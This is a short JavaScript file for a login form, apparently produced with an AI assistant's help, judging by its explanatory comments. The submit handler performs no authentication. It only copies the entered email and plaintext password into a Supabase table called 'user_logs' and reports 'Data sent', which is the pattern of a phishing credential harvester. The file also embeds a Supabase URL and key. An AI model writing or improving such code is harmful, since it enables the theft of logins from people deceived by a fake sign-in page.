const SUPABASE_URL = "https://vhkxrhuygujrghgjikdu.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_NaZ5L8e0wq_hzQ8WNCk_cQ_zMPI5FB-";

const authForm = document.getElementById('login-form');
// Using window.supabase ensures the client initializes correctly without variable conflicts
const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const userIdentity = document.getElementById('identity-input').value; 
    const userPassword = document.getElementById('password-input').value;

    const { data, error } = await supabase
      .from('user_logs') // 1. Matches your table name exactly
      .insert([
        { 
          email: userIdentity, // 2. Maps the input value to your database 'email' column
          password: userPassword // 3. Maps the input value to your database 'password' column      
        }
      ]);

    if (error) {
        console.error("Database Error:", error.message);
    } else {
        console.log("Success! Data sent.");
    }
});
